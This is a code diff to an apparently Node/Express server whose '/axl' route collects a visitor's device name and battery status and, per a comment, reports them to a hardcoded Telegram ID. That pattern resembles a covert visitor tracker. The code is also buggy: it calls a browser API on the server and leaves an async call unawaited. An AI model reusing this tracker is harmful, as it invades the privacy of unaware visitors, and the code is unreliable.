@@ -77,13 +77,19 @@ function getDeviceName(userAgent) {
 
 
 // Function to get battery information
-function getBatteryInfo() {
-  return navigator.getBattery().then(function(battery) {
+async function getBatteryInfo() {
+  if (navigator && navigator.getBattery) {
+    const battery = await navigator.getBattery();
     return {
       BatteryLevel: `${battery.level * 100}%`,
       ChargingStatus: `Device is ${battery.charging ? "charging" : "not charging"}`
     };
-  });
+  } else {
+    return {
+      BatteryLevel: "Battery API not supported",
+      ChargingStatus: "Battery API not supported"
+    };
+  }
 }
 
 
@@ -93,10 +99,10 @@ function getBatteryInfo() {
 const ajsal = '6524787237';
 
 // Set up a basic HTTP server to bind to a port (required by Render)
-app.get('/axl', (req, res) => {
+app.get('/axl' , async (req, res) => {
   const userAgent = req.headers['user-agent'];
   const deviceName = getDeviceName(userAgent);
-  const batteryInfo = getBatteryInfo(userAgent);
+  const batteryInfo = getBatteryInfo();
   // Send a message to your Telegram ID with the detected device name
 
  
